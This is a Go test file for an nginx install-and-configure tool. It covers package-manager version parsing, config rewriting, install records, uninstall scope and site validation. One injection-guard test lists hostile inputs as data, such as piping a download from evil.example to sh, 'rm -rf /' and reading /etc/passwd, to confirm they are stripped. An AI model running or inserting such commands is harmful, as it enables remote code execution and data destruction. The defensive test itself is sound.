package main

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

func assertEqual(t *testing.T, name string, got, want []string) {
	t.Helper()
	if !reflect.DeepEqual(got, want) {
		t.Errorf("%s 解析结果不符\n  实际: %v\n  期望: %v", name, got, want)
	}
}

// Ubuntu 22.04 官方源只提供 1.18.0 一个系列，updates 与 security 源版本相同，
// 去重后只剩 2 个 —— 这就是接口返回数量少的根本原因，而非解析漏掉了版本。
func TestParseAptMadisonUbuntuOfficial(t *testing.T) {
	out := `nginx | 1.18.0-6ubuntu14.3 | http://tw.archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages
nginx | 1.18.0-6ubuntu14.3 | http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages
nginx | 1.18.0-6ubuntu14 | http://tw.archive.ubuntu.com/ubuntu jammy/main amd64 Packages
`
	assertEqual(t, "apt Ubuntu 官方源", parseAptMadison(out),
		[]string{"1.18.0-6ubuntu14.3", "1.18.0-6ubuntu14"})
}

// 添加 nginx.org 官方源后，同一条命令能列出大量历史版本，解析不应丢失任何一行。
func TestParseAptMadisonNginxOrg(t *testing.T) {
	out := `nginx | 1.28.0-1~jammy | http://nginx.org/packages/ubuntu jammy/nginx amd64 Packages
nginx | 1.26.3-1~jammy | http://nginx.org/packages/ubuntu jammy/nginx amd64 Packages
nginx | 1.26.2-1~jammy | http://nginx.org/packages/ubuntu jammy/nginx amd64 Packages
nginx | 1.26.1-2~jammy | http://nginx.org/packages/ubuntu jammy/nginx amd64 Packages
nginx | 1.26.1-1~jammy | http://nginx.org/packages/ubuntu jammy/nginx amd64 Packages
`
	assertEqual(t, "apt nginx.org 源", parseAptMadison(out),
		[]string{"1.28.0-1~jammy", "1.26.3-1~jammy", "1.26.2-1~jammy", "1.26.1-2~jammy", "1.26.1-1~jammy"})
}

// 非 nginx 包（如 libnginx-mod-http-geoip）不应被计入
func TestParseAptMadisonIgnoresOtherPackages(t *testing.T) {
	out := `nginx | 1.18.0-6ubuntu14 | http://archive.ubuntu.com/ubuntu jammy/main amd64 Packages
libnginx-mod-http-geoip | 1.18.0-6ubuntu14 | http://archive.ubuntu.com/ubuntu jammy/main amd64 Packages
nginx-core | 1.18.0-6ubuntu14 | http://archive.ubuntu.com/ubuntu jammy/main amd64 Packages
`
	assertEqual(t, "apt 过滤无关包", parseAptMadison(out), []string{"1.18.0-6ubuntu14"})
}

func TestParseAptMadisonEmpty(t *testing.T) {
	assertEqual(t, "apt 空输出", parseAptMadison(""), []string(nil))
	assertEqual(t, "apt 无匹配行", parseAptMadison("no such package\n"), []string(nil))
}

func TestParseDnfList(t *testing.T) {
	out := `Last metadata expiration check: 0:01:23 ago.
Available Packages
nginx.x86_64        1:1.24.0-1.el8        epel
nginx.x86_64        1:1.20.1-1.el8        epel
`
	assertEqual(t, "dnf", parseDnfList(out), []string{"1:1.24.0-1.el8", "1:1.20.1-1.el8"})
}

func TestParseApkPolicy(t *testing.T) {
	out := `nginx policy:
  1.24.0-r6:
    https://dl-cdn.alpinelinux.org/alpine/v3.18/main
  1.22.1-r0:
    https://dl-cdn.alpinelinux.org/alpine/v3.17/main
`
	assertEqual(t, "apk", parseApkPolicy(out), []string{"1.24.0-r6", "1.22.1-r0"})
}

// 版本带 epoch 前缀（如 1:1.24.0）时，前端归一化会去掉 epoch。
// 这里验证后端原样保留完整版本字符串，不做任何截断。
func TestBackendKeepsFullVersion(t *testing.T) {
	out := `nginx | 1:1.24.0-1 | http://example.com repo amd64 Packages
`
	assertEqual(t, "epoch 版本", parseAptMadison(out), []string{"1:1.24.0-1"})
}

func TestCoreVersion(t *testing.T) {
	cases := map[string]string{
		"1.24.0-2ubuntu7.1":           "1.24.0",
		"nginx/1.24.0":                "1.24.0",
		"1:1.24.0-1":                  "1.24.0",
		"1.18.0-6ubuntu14.3":          "1.18.0",
		"1.24.0-r6":                   "1.24.0",
		"1.28.0-1~jammy":              "1.28.0",
		"1.24.0":                      "1.24.0",
		"":                            "",
		"unknown":                     "",
		"nginx version: nginx/1.24.0": "1.24.0",
	}
	for in, want := range cases {
		if got := coreVersion(in); got != want {
			t.Errorf("coreVersion(%q) = %q, 期望 %q", in, got, want)
		}
	}
}

// 版本号会拼进下载 URL 并作为命令参数执行，必须确保恶意输入无法逃逸。
// coreVersion 只提取数字版本段，天然剥离了危险字符，再经 strictVersionRe 二次校验。
func TestVersionInjectionGuard(t *testing.T) {
	// 含合法版本号但夹带危险片段：解析后必须只剩纯版本号
	mixed := []string{
		"1.24.0; cat /etc/passwd",
		"1.24.0 && curl http://evil.example | sh",
		"1.24.0`touch /tmp/pwned`",
		"1.24.0$(reboot)",
	}
	for _, in := range mixed {
		got := coreVersion(in)
		if got != "1.24.0" {
			t.Errorf("输入 %q 解析为 %q，期望剥离危险片段后得到 1.24.0", in, got)
		}
		if !strictVersionRe.MatchString(got) {
			t.Errorf("解析结果 %q 未通过版本校验", got)
		}
	}

	// 纯恶意输入：不含数字版本，必须解析为空并被拒绝
	evil := []string{
		"; rm -rf /",
		"$(reboot)",
		"../../etc/passwd",
		"&& curl http://evil.example",
		"unknown",
		"",
	}
	for _, in := range evil {
		if got := coreVersion(in); strictVersionRe.MatchString(got) {
			t.Errorf("恶意输入 %q 通过了版本校验，解析结果 %q", in, got)
		}
	}
}

// ensureConfigInclude 用程序化改写替代交互式 vim 编辑，需保证写入位置正确且幂等
func TestEnsureConfigInclude(t *testing.T) {
	dir := t.TempDir()
	confPath := filepath.Join(dir, "nginx.conf")
	original := `user  nginx;
worker_processes  auto;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    sendfile        on;

    server {
        listen       80;
        server_name  localhost;
    }
}
`
	if err := os.WriteFile(confPath, []byte(original), 0o644); err != nil {
		t.Fatal(err)
	}

	if err := ensureConfigInclude(confPath); err != nil {
		t.Fatalf("首次写入失败: %v", err)
	}

	if _, err := os.Stat(filepath.Join(dir, configDirName)); err != nil {
		t.Errorf("config.d 目录未创建: %v", err)
	}

	data, err := os.ReadFile(confPath)
	if err != nil {
		t.Fatal(err)
	}
	content := string(data)
	if !strings.Contains(content, "include config.d/*.conf;") {
		t.Fatalf("未写入 include 指令:\n%s", content)
	}
	// include 必须落在 http 块内，即最后一个 '}' 之前
	if strings.Index(content, "include config.d") > strings.LastIndex(content, "}") {
		t.Errorf("include 被写到了 http 块之外:\n%s", content)
	}

	// 幂等：重复调用不应重复追加
	if err := ensureConfigInclude(confPath); err != nil {
		t.Fatal(err)
	}
	again, err := os.ReadFile(confPath)
	if err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(string(again), "include config.d/*.conf;"); n != 1 {
		t.Errorf("重复调用后 include 出现 %d 次，期望 1 次", n)
	}
}

func TestEnsureConfigIncludeMissingFile(t *testing.T) {
	if err := ensureConfigInclude(filepath.Join(t.TempDir(), "nope.conf")); err == nil {
		t.Error("配置文件不存在时应返回错误")
	}
}

// OpenSSL 3.0 起，HMAC_Init_ex / ENGINE_by_id 等被标记为废弃，而 nginx 编译时
// 默认带 -Werror，会让这类告警直接变成编译错误导致 ngx_event_openssl.c 中断。
// 该测试用于防止这个兼容选项在后续改动中被误删。
func TestConfigureArgsIncludeOpenSSL3Compat(t *testing.T) {
	args := configureArgs()
	joined := strings.Join(args, " ")

	if !strings.Contains(joined, ccOpt) {
		t.Errorf("configure 参数缺少 OpenSSL 3.0 兼容选项 %q: %v", ccOpt, args)
	}
	for _, want := range []string{
		"--prefix=" + installPrefix,
		"--with-http_ssl_module",
		"--with-http_v2_module",
		"--with-http_gzip_static_module",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("configure 参数缺少 %q: %v", want, args)
		}
	}
	// cc-opt 必须以 --with-cc-opt= 形式传递，否则 configure 无法识别
	for _, a := range args {
		if strings.HasPrefix(a, "--with-cc-opt") && !strings.HasPrefix(a, "--with-cc-opt=") {
			t.Errorf("cc-opt 参数格式错误: %q", a)
		}
	}
}

func TestNewInstallRecordPaths(t *testing.T) {
	rec := newInstallRecord("1.24.0", time.Time{})
	cases := map[string]string{
		"prefix":      installPrefix,
		"configPath":  filepath.Join(installPrefix, "conf", "nginx.conf"),
		"configDir":   filepath.Join(installPrefix, "conf", configDirName),
		"binPath":     filepath.Join(installPrefix, "sbin", "nginx"),
		"symlinkPath": "/usr/bin/nginx",
		"logDir":      filepath.Join(installPrefix, "logs"),
		"sourceDir":   filepath.Join(sourceDir, "nginx-1.24.0"),
	}
	got := map[string]string{
		"prefix":      rec.Prefix,
		"configPath":  rec.ConfigPath,
		"configDir":   rec.ConfigDir,
		"binPath":     rec.BinPath,
		"symlinkPath": rec.SymlinkPath,
		"logDir":      rec.LogDir,
		"sourceDir":   rec.SourceDir,
	}
	for k, want := range cases {
		if got[k] != want {
			t.Errorf("%s = %q, 期望 %q", k, got[k], want)
		}
	}
	if len(rec.ConfigureArgs) == 0 {
		t.Error("记录应包含编译参数，便于复现安装")
	}
}

func TestSaveAndLoadInstallRecord(t *testing.T) {
	path := filepath.Join(t.TempDir(), "records.json")

	// 尚未安装过时，读取应返回空列表且不报错
	got, err := loadRecordsFrom(path)
	if err != nil {
		t.Fatalf("文件不存在时不应报错: %v", err)
	}
	if len(got) != 0 {
		t.Errorf("文件不存在时应返回空列表，实际 %d 条", len(got))
	}

	if err := saveRecordTo(path, newInstallRecord("1.24.0", time.Now().Add(-time.Hour))); err != nil {
		t.Fatalf("保存 1.24.0 失败: %v", err)
	}
	if err := saveRecordTo(path, newInstallRecord("1.26.0", time.Now())); err != nil {
		t.Fatalf("保存 1.26.0 失败: %v", err)
	}

	records, err := loadRecordsFrom(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(records) != 2 {
		t.Fatalf("应有 2 条记录，实际 %d 条", len(records))
	}
	if records[0].Version != "1.26.0" {
		t.Errorf("最新记录应排在最前，实际首条为 %s", records[0].Version)
	}

	// 同一版本重复安装应覆盖，而不是追加出重复条目
	if err := saveRecordTo(path, newInstallRecord("1.26.0", time.Now().Add(time.Minute))); err != nil {
		t.Fatal(err)
	}
	records, err = loadRecordsFrom(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(records) != 2 {
		t.Errorf("同版本覆盖后仍应为 2 条，实际 %d 条", len(records))
	}
	if records[0].Version != "1.26.0" {
		t.Errorf("覆盖后首条仍应为 1.26.0，实际 %s", records[0].Version)
	}
}

// TestRunUninstallRemovesArtifacts 验证卸载确实清除了本工具安装的全部产物，
// 且不会误删安装前缀之外的无关文件（破坏性操作必须严格限定范围）。
func TestRunUninstallRemovesArtifacts(t *testing.T) {
	base := t.TempDir()

	// 临时重定向安装前缀与源码目录到临时区，避免波及真实系统
	origPrefix, origSrc := installPrefix, sourceDir
	installPrefix = filepath.Join(base, "usr", "local", "nginx")
	sourceDir = filepath.Join(base, "data", "soft")
	defer func() {
		installPrefix, sourceDir = origPrefix, origSrc
	}()

	// 构造一个模拟的安装产物布局
	prefix := installPrefix
	binDir := filepath.Join(prefix, "sbin")
	if err := os.MkdirAll(binDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(binDir, "nginx"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	confDir := filepath.Join(prefix, "conf")
	if err := os.MkdirAll(confDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(confDir, "nginx.conf"), []byte("events{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	src := filepath.Join(sourceDir, "nginx-1.24.0")
	if err := os.MkdirAll(src, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(src, "Makefile"), []byte("all:\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 一个完全位于安装前缀之外的文件，卸载绝不应触碰
	outside := filepath.Join(base, "etc", "keep.conf")
	if err := os.MkdirAll(filepath.Dir(outside), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(outside, []byte("keep"), 0o644); err != nil {
		t.Fatal(err)
	}

	task := &installTask{ID: "t1", Action: actionUninstall, Version: "1.24.0", Status: "running"}
	task.run() // 经 run() 统一入口，才能走到卸载流程并翻转最终状态

	// 安装前缀、源码目录均被删除
	for _, p := range []string{prefix, src} {
		if _, err := os.Stat(p); !os.IsNotExist(err) {
			t.Errorf("卸载后 %s 应被删除", p)
		}
	}
	// 无关文件完好
	if _, err := os.Stat(outside); err != nil {
		t.Errorf("卸载误删了前缀之外的文件: %v", err)
	}
	// 任务状态应为成功
	task.mu.Lock()
	status := task.Status
	task.mu.Unlock()
	if status != "success" {
		t.Errorf("卸载任务状态应为 success，实际 %q", status)
	}
}

// TestRunDispatchUninstall 验证 run() 依据 Action 正确分发到卸载流程。
func TestRunDispatchUninstall(t *testing.T) {
	base := t.TempDir()
	origPrefix, origSrc := installPrefix, sourceDir
	installPrefix = filepath.Join(base, "usr", "local", "nginx")
	sourceDir = filepath.Join(base, "data", "soft")
	defer func() {
		installPrefix, sourceDir = origPrefix, origSrc
	}()

	if err := os.MkdirAll(installPrefix, 0o755); err != nil {
		t.Fatal(err)
	}
	marker := filepath.Join(installPrefix, "marker")
	if err := os.WriteFile(marker, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}

	task := &installTask{ID: "t2", Action: actionUninstall, Version: "1.24.0", Status: "running"}
	task.run() // run 自身不启 goroutine（handler 才启），可直接同步调用

	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Error("run() 未分发到卸载流程：安装前缀内的标记文件未被删除")
	}
	task.mu.Lock()
	status := task.Status
	task.mu.Unlock()
	if status != "success" {
		t.Errorf("run() 分发到卸载流程后状态应为 success，实际 %q", status)
	}
}

// ---------------------------------------------------------------- 站点配置

func TestSanitizeSiteFile(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"example.com", "example.com.conf"},
		{"www.example.com", "www.example.com.conf"},
		{"*.example.com", "*.example.com.conf"},
		{"../escape", ".._escape.conf"}, // 路径穿越被剥离斜杠（无分隔符即安全）
		{"a/b/c", "a_b_c.conf"},         // 目录分隔符被替换
		{"", "site.conf"},               // 空域名回退
		{"site.conf", "site.conf"},      // 已含 .conf 后缀则不重复追加
		{".", "site.conf"},              // 特殊名回退
	}
	for _, c := range cases {
		got := sanitizeSiteFile(c.in)
		if got != c.want {
			t.Errorf("sanitizeSiteFile(%q) = %q，期望 %q", c.in, got, c.want)
		}
	}
}

func TestParseSiteConf(t *testing.T) {
	content := `server {
    listen 8080;
    server_name www.example.com;
    root /var/www/example.com;
}`
	domain, listen, root := parseSiteConf(content)
	if domain != "www.example.com" {
		t.Errorf("domain = %q，期望 www.example.com", domain)
	}
	if listen != 8080 {
		t.Errorf("listen = %d，期望 8080", listen)
	}
	if root != "/var/www/example.com" {
		t.Errorf("root = %q，期望 /var/www/example.com", root)
	}
}

func TestRenderSiteConfRoundTrip(t *testing.T) {
	domain, listen, root := "api.example.com", 8443, "/srv/api"
	content := renderSiteConf(domain, listen, root)
	gotDomain, gotListen, gotRoot := parseSiteConf(content)
	if gotDomain != domain || gotListen != listen || gotRoot != root {
		t.Errorf("render→parse 不守恒: 入(%s,%d,%s) 出(%s,%d,%s)",
			domain, listen, root, gotDomain, gotListen, gotRoot)
	}
	// 渲染产物必须含 include 所需的 server 块与关键字段
	for _, must := range []string{"server {", "listen 8443;", "server_name api.example.com;", "root /srv/api;"} {
		if !strings.Contains(content, must) {
			t.Errorf("renderSiteConf 产物缺少关键行: %q", must)
		}
	}
}

func TestIsValidServerName(t *testing.T) {
	valid := []string{
		"example.com", "www.example.com", "*.example.com", "_",
		"192.168.1.1", "10.0.0.255", "2001:db8::1",
	}
	for _, s := range valid {
		if !isValidServerName(s) {
			t.Errorf("应为合法 server_name，实际判为非法的: %q", s)
		}
	}
	invalid := []string{
		"", "bad/name", "999.999.999.999", // 非法字符 / 越界八位组
		"1.2.3", "256.1.1.1", ".1.2.3", // 段数不对 / 八位组越界
		"2001:db8::@1", // IPv6 含非法字符（@）
	}
	for _, s := range invalid {
		if isValidServerName(s) {
			t.Errorf("应为非法 server_name，实际判为合法: %q", s)
		}
	}
}

func TestSiteInputValidate(t *testing.T) {
	ok := siteInput{Domain: "example.com", Listen: 80, Root: "/var/www"}
	if msg := ok.validate(); msg != "" {
		t.Errorf("合法输入不应报错，实际: %s", msg)
	}
	// 域名或 IP 均可作为站点标识
	good := []siteInput{
		{Domain: "192.168.1.1", Listen: 80, Root: "/var/www"},
		{Domain: "2001:db8::1", Listen: 8080, Root: "/var/www"},
		{Domain: "_", Listen: 80, Root: "/var/www"},
	}
	for i, in := range good {
		if msg := in.validate(); msg != "" {
			t.Errorf("合法用例 %d 不应报错，实际: %s", i, msg)
		}
	}
	bad := []siteInput{
		{Domain: "", Listen: 80, Root: "/var/www"},
		{Domain: "bad/name", Listen: 80, Root: "/var/www"},        // 含非法字符
		{Domain: "999.999.999.999", Listen: 80, Root: "/var/www"}, // 八位组越界
		{Domain: "a.com", Listen: 0, Root: "/var/www"},            // 端口越界
		{Domain: "a.com", Listen: 70000, Root: "/var/www"},        // 端口越界
		{Domain: "a.com", Listen: 80, Root: ""},                   // 根目录空
		{Domain: "a.com", Listen: 80, Root: "relative"},           // 非绝对路径
	}
	for i, in := range bad {
		if msg := in.validate(); msg == "" {
			t.Errorf("用例 %d 应报错但未报错: %+v", i, in)
		}
	}
}
